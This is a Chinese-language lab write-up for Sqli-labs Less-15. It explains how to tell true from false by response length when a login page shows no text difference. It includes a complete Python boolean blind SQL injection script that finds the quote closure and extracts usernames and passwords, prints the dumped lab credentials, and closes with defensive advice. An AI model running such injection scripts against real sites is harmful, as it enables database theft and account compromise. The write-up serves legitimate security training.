## 题目: Sqli-labs Less-15

## 题目描述
本关是一个登录框页面，标题为 `Blind - Boolian Based - String`。
这关的变态之处在于：无论登录成功还是失败，页面**都不显示** `You are in` 或具体的报错信息，这让传统的盲注判断失去了依据。

## 解题思路
既然页面的文字没有任何变化，我们可以通过**判断页面 HTML 代码的总长度**来区分对错。通常，登录成功（True）和登录失败（False）返回的网页模板长度是不一样的。

利用这个特性，我们编写一个 Python 脚本：
1. 先发一个正常失败的请求，记录基准长度。
2. 尝试不同的闭合符（如 `'`, `")` 等），如果注入 `and 1=1` 后页面长度改变，则说明闭合符正确。
3. 使用二分法进行爆破，判断条件为：`len(response.text) != base_len`。

## 解题步骤
**1. 测试闭合符（⚠️ 踩坑记录）**
* **实战操作**：一开始沿用 Less-14 的思路，写了一个自动探测闭合符的脚本，通过判断页面里是否包含 `You are in` 来确认闭合。
* **踩坑**：脚本运行后直接提示“探测失败”。仔细观察这关的页面，发现无论输入什么，页面都只显示一张图片，压根不存在 `You are in` 这句话。
* **破局**：既然看不见文字，那就“看长度”。先发一个绝对错误的包记录基准长度，再发 `and 1=1`。如果页面返回的长度发生改变，就说明闭合符正确且条件成立。

**2. 编写基于长度的布尔盲注脚本**

**实战 Payload 核心代码**：

```python
import requests

url = "http://127.0.0.1/sqli-labs/Less-15/"
query = "(select group_concat(username,0x3a,password) from users)"
result = ""

# 记录正常失败页面的长度作为基准
base_data = {'uname': 'admin', 'passwd': '1', 'submit': 'Submit'}
r_base = requests.post(url, data=base_data)
base_len = len(r_base.text)

prefixes = ["admin')", 'admin")', "admin'", 'admin"']
valid_prefix = None

# 1. 基于长度变化探测闭合符
for p in prefixes:
    payload = p + " and 1=1 #"
    data = {'uname': payload, 'passwd': '1', 'submit': 'Submit'}
    r = requests.post(url, data=data)
    if len(r.text) != base_len:
        valid_prefix = p
        break

# 2. 布尔盲注爆破
for i in range(1, 100):
    low, high = 32, 127
    while low <= high:
        mid = (low + high) // 2
        payload = f'{valid_prefix} and ascii(substr({query},{i},1))>{mid} #'
        data = {'uname': payload, 'passwd': '1', 'submit': 'Submit'}
        r = requests.post(url, data=data)
        
        # 核心判断：如果长度变了，说明条件成立
        if len(r.text) != base_len:
            low = mid + 1
        else:
            high = mid - 1
            
    if low == 32 or low == 0 or low == 127:
        break
    result += chr(low)
    print(f"[+] 当前结果: {result}")
```

**3. 运行结果**
成功爆出全部账号密码数据：
```text
Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman...
```

## 知识点总结
* 盲注的多样性：当页面内容（文字）没有差异时，可以尝试观察 HTTP 状态码（200 vs 302）、响应时间（时间盲注）、或者页面长度（布尔盲注）。
* 基准值对比法：在做布尔盲注时，先发一个绝对错误的包，拿它的响应（长度或内容）作为基准，然后每次注入判断是否偏离基准。
* 防御策略：使用 PDO 预编译；统一错误页面的返回内容；关闭生产环境的详细报错回显。
